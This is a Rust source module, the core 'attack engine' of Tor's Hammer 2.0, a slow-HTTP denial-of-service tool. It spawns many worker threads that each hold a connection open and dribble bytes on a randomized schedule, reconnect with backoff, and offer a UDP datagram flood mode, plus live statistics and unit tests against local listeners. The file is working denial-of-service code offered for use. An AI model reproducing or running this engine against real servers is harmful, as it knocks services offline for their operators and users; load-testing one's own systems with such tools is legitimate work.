//! Rust attack engine for Tor's Hammer 2.0.
//!
//! The engine mirrors the Python backend's architecture: `concurrency`
//! persistent workers each hold one slow HTTP connection, dribble bytes on a
//! randomized schedule, and reconnect once the profile completes. A lightweight
//! SplitMix64 PRNG supplies per-connection randomization and atomic counters
//! keep the live reporter cheap.

pub mod profiles;
pub mod rng;
pub mod signals;
pub mod stats;
pub mod udp;
pub mod url;

use crate::engine::rng::Rng;
use crate::engine::stats::{human_size, Stats};
use std::net::{Shutdown, TcpStream, ToSocketAddrs, UdpSocket};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

/// Fully-resolved engine settings (mirrors the Python `Config`).
#[derive(Clone, Debug)]
pub struct EngineConfig {
    pub host: String,
    pub port: u16,
    pub path: String,
    pub header_host: String,
    pub secure: bool,
    pub mode: String,
    pub concurrency: usize,
    pub duration: f64,
    pub delay_min: f64,
    pub delay_max: f64,
    pub connect_timeout: f64,
    pub base_post_length: usize,
    pub randomize_path: bool,
    pub method: Option<String>,
    pub custom_headers: Vec<(String, String)>,
    pub custom_body: Option<Vec<u8>>,
    pub json: bool,
    pub stats_interval: f64,
    pub quiet: bool,
    pub verbose: bool,
    pub max_errors: usize,
    pub fail_under: usize,
    pub fail_on_zero: bool,
}

/// Run the attack until the duration elapses or Ctrl-C is pressed.
///
/// Returns the process exit code (0 = success, 1 = automation failure).
pub fn run(config: EngineConfig) -> i32 {
    signals::install();

    let concurrency = config.concurrency.max(1);
    let cfg = Arc::new(config);
    let stats = Arc::new(Stats::new());
    let running = Arc::new(AtomicBool::new(true));
    let breaker = Arc::new(AtomicBool::new(false));
    let started = Instant::now();
    let deadline = if cfg.duration > 0.0 {
        Some(started + Duration::from_secs_f64(cfg.duration))
    } else {
        None
    };

    let mut handles = Vec::with_capacity(concurrency);
    for i in 0..concurrency {
        let c = Arc::clone(&cfg);
        let s = Arc::clone(&stats);
        let r = Arc::clone(&running);
        let b = Arc::clone(&breaker);
        match thread::Builder::new()
            .name(format!("thm-worker-{i}"))
            .stack_size(256 * 1024)
            .spawn(move || worker(i, c, s, r, b))
        {
            Ok(handle) => handles.push(handle),
            Err(err) => {
                if cfg.verbose {
                    eprintln!("  [w{i}] failed to spawn worker: {err}");
                }
                stats.record_error();
            }
        }
    }

    // --- live reporter / monitor loop (runs on the main thread) ---
    let mut last_tick = started;
    let mut last_sent = 0u64;
    let mut last_recv = 0u64;
    loop {
        let interval = Duration::from_secs_f64(cfg.stats_interval.max(0.05));
        let mut waited = Duration::ZERO;
        while waited < interval {
            thread::sleep(Duration::from_millis(100));
            waited += Duration::from_millis(100);
            if signals::shutdown_requested() {
                break;
            }
        }
        let expired = deadline.is_some_and(|d| Instant::now() >= d);
        if signals::shutdown_requested() || expired {
            break;
        }
        let now = Instant::now();
        let dt = now.duration_since(last_tick).as_secs_f64().max(1e-9);
        let sent = stats.bytes_sent();
        let recv = stats.bytes_received();
        let sent_rate = (sent - last_sent) as f64 / dt;
        let recv_rate = (recv - last_recv) as f64 / dt;
        last_tick = now;
        last_sent = sent;
        last_recv = recv;
        let uptime = now.duration_since(started).as_secs_f64();

        if cfg.json {
            report_json(&stats, uptime, sent_rate, recv_rate);
        } else if !cfg.quiet {
            report_live(&stats, uptime, sent_rate, recv_rate);
        }
    }

    running.store(false, Ordering::SeqCst);
    for handle in handles {
        let _ = handle.join();
    }

    let uptime = started.elapsed().as_secs_f64().max(1e-9);
    if cfg.json {
        report_json(&stats, uptime, 0.0, 0.0);
    } else {
        if !cfg.quiet {
            println!();
        }
        report_summary(&stats, uptime);
    }

    // Automation exit codes (mirrors the Python CLI).
    if breaker.load(Ordering::Relaxed) {
        eprintln!("\nCircuit breaker triggered: too many consecutive errors.");
        1
    } else if cfg.fail_under > 0 && stats.peak_active() < cfg.fail_under as u64 {
        eprintln!(
            "\nAutomation failure: peak active connections ({}) below threshold ({})",
            stats.peak_active(),
            cfg.fail_under
        );
        1
    } else if cfg.fail_on_zero && stats.connections() == 0 {
        eprintln!("\nAutomation failure: zero connections opened");
        1
    } else {
        0
    }
}

fn worker(
    index: usize,
    cfg: Arc<EngineConfig>,
    stats: Arc<Stats>,
    running: Arc<AtomicBool>,
    breaker: Arc<AtomicBool>,
) {
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0)
        ^ (index as u64).wrapping_mul(0x9E37_79B9_7F4A_7C15);
    let mut rng = Rng::new(seed);
    let mut backoff = 0.3f64;
    let mut consecutive = 0usize;

    loop {
        if !running.load(Ordering::Relaxed) || signals::shutdown_requested() {
            break;
        }
        if cfg.max_errors > 0 && consecutive >= cfg.max_errors {
            breaker.store(true, Ordering::SeqCst);
            running.store(false, Ordering::SeqCst);
            break;
        }

        // UDP mode: real datagram transport (no TCP stream or handshake).
        if cfg.mode.as_str() == "udp" {
            match udp::open(&cfg) {
                Ok(mut sock) => {
                    stats.record_connect();
                    consecutive = 0;
                    backoff = 0.3;
                    let completed = udp::run(&cfg, &mut sock, &stats, &running, &mut rng);
                    stats.record_disconnect();
                    if completed {
                        stats.record_completed();
                    }
                }
                Err(err) => {
                    stats.record_error();
                    consecutive += 1;
                    if cfg.verbose {
                        eprintln!("  [w{index}] {err} (consecutive: {consecutive})");
                    }
                    let delay = backoff * (1.0 + 0.1 + rng.f64() * 0.2);
                    sleep_slices(&running, delay);
                    backoff = (backoff * 2.0).min(30.0);
                }
            }
            continue;
        }

        let mut stream = match open_connection(&cfg) {
            Ok(stream) => stream,
            Err(err) => {
                stats.record_error();
                consecutive += 1;
                if cfg.verbose {
                    eprintln!("  [w{index}] {err} (consecutive: {consecutive})");
                }
                // Exponential backoff with jitter (mirrors the Python engine).
                let delay = backoff * (1.0 + 0.1 + rng.f64() * 0.2);
                sleep_slices(&running, delay);
                backoff = (backoff * 2.0).min(30.0);
                continue;
            }
        };

        stats.record_connect();
        consecutive = 0;
        backoff = 0.3;
        let completed = profiles::run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stats.record_disconnect();
        if completed {
            stats.record_completed();
        }
        let _ = stream.shutdown(Shutdown::Both);
    }
}

fn open_connection(cfg: &EngineConfig) -> std::io::Result<TcpStream> {
    let mut last_error: Option<std::io::Error> = None;
    for addr in (cfg.host.as_str(), cfg.port).to_socket_addrs()? {
        match TcpStream::connect_timeout(&addr, Duration::from_secs_f64(cfg.connect_timeout.max(1.0)))
        {
            Ok(stream) => {
                let _ = stream.set_nodelay(true);
                let _ = stream.set_write_timeout(Some(Duration::from_secs_f64(
                    (cfg.connect_timeout * 3.0).max(5.0),
                )));
                return Ok(stream);
            }
            Err(err) => last_error = Some(err),
        }
    }
    Err(last_error.unwrap_or_else(|| {
        std::io::Error::new(std::io::ErrorKind::NotFound, "no address resolved")
    }))
}

/// Sleep in small slices so Ctrl-C / stop flags are honored quickly.
pub(crate) fn sleep_slices(running: &AtomicBool, seconds: f64) {
    let mut remaining = seconds;
    while remaining > 0.0 && running.load(Ordering::Relaxed) && !signals::shutdown_requested() {
        let slice = remaining.min(0.1);
        thread::sleep(Duration::from_secs_f64(slice));
        remaining -= slice;
    }
}

fn report_live(stats: &Stats, uptime: f64, sent_rate: f64, recv_rate: f64) {
    use std::io::Write;
    let mins = (uptime as u64) / 60;
    let secs = (uptime as u64) % 60;
    let line = format!(
        "\rthm | conns={} open={} done={} err={} | sent {} @{}/s | recv {} @{}/s | {mins}:{secs:02}",
        stats.connections(),
        stats.active(),
        stats.completed(),
        stats.errors(),
        human_size(stats.bytes_sent() as f64),
        human_size(sent_rate),
        human_size(stats.bytes_received() as f64),
        human_size(recv_rate),
    );
    print!("{line:<130}");
    let _ = std::io::stdout().flush();
}

fn report_json(stats: &Stats, uptime: f64, sent_rate: f64, recv_rate: f64) {
    // Mirrors the Python engine's JSON payload.
    eprintln!(
        r#"{{"connections":{},"active":{},"peak_active":{},"completed":{},"errors":{},"bytes_sent":{},"bytes_received":{},"sent_bytes_per_sec":{:.1},"recv_bytes_per_sec":{:.1},"uptime":{:.1}}}"#,
        stats.connections(),
        stats.active(),
        stats.peak_active(),
        stats.completed(),
        stats.errors(),
        stats.bytes_sent(),
        stats.bytes_received(),
        sent_rate,
        recv_rate,
        uptime,
    );
}

fn report_summary(stats: &Stats, uptime: f64) {
    let mins = (uptime as u64) / 60;
    let secs = (uptime as u64) % 60;
    println!("  connections opened : {}", stats.connections());
    println!("  peak concurrent    : {}", stats.peak_active());
    println!("  completed cycles   : {}", stats.completed());
    println!("  errors             : {}", stats.errors());
    println!(
        "  bytes sent         : {}",
        human_size(stats.bytes_sent() as f64)
    );
    println!(
        "  bytes received     : {}",
        human_size(stats.bytes_received() as f64)
    );
    println!("  elapsed            : {mins}:{secs:02}");
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;

    fn test_config(port: u16) -> EngineConfig {
        EngineConfig {
            host: "127.0.0.1".into(),
            port,
            path: "/".into(),
            header_host: "127.0.0.1".into(),
            secure: false,
            mode: "slow-headers".into(),
            concurrency: 8,
            duration: 1.0,
            delay_min: 0.001,
            delay_max: 0.005,
            connect_timeout: 3.0,
            base_post_length: 16,
            randomize_path: true,
            method: None,
            custom_headers: vec![],
            custom_body: None,
            json: true,
            stats_interval: 0.2,
            quiet: true,
            verbose: false,
            max_errors: 0,
            fail_under: 0,
            fail_on_zero: false,
        }
    }

    #[test]
    fn engine_opens_and_holds_connections_against_local_listener() {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let stop_accepting = Arc::new(AtomicBool::new(false));
        let stop2 = stop_accepting.clone();

        let acceptor = thread::spawn(move || {
            listener.set_nonblocking(true).ok();
            let mut accepted = 0u32;
            let deadline = Instant::now() + Duration::from_millis(3000);
            while Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match listener.accept() {
                    Ok((mut sock, _)) => {
                        accepted += 1;
                        let _ = sock.read(&mut [0u8; 64]); // hold the socket open
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
            accepted
        });

        let code = run(test_config(addr.port()));
        stop_accepting.store(true, Ordering::Relaxed);
        let accepted = acceptor.join().unwrap();

        assert_eq!(code, 0, "engine should exit 0 on a clean run");
        assert!(accepted >= 4, "expected workers to connect, got {accepted}");
    }

    fn udp_config(port: u16) -> EngineConfig {
        let mut c = test_config(port);
        c.mode = "udp".into();
        c.duration = 0.6;
        c.base_post_length = 128;
        c.delay_min = 0.0005;
        c.delay_max = 0.001;
        c.concurrency = 4;
        c
    }

    #[test]
    fn engine_udp_sends_real_datagrams_to_a_local_receiver() {
        let receiver = std::net::UdpSocket::bind("127.0.0.1:0").unwrap();
        let port = receiver.local_addr().unwrap().port();
        let stop = Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();

        let collector = thread::spawn(move || {
            let _ = receiver.set_read_timeout(Some(Duration::from_millis(30)));
            let mut datagrams = 0u32;
            let mut bytes = 0u64;
            let mut buf = [0u8; 2048];
            let deadline = Instant::now() + Duration::from_millis(2500);
            while Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match receiver.recv_from(&mut buf[..]) {
                    Ok((n, _)) => {
                        datagrams += 1;
                        bytes += n as u64;
                    }
                    Err(_) => thread::sleep(Duration::from_millis(2)),
                }
            }
            (datagrams, bytes)
        });

        let code = run(udp_config(port));
        stop.store(true, Ordering::Relaxed);
        let (datagrams, bytes) = collector.join().unwrap();

        assert_eq!(code, 0, "udp engine should exit 0 on a clean run");
        assert!(
            datagrams > 0,
            "expected workers to send UDP datagrams, got {datagrams}"
        );
        assert!(bytes > 0, "expected collected UDP bytes, got {bytes}");
    }
}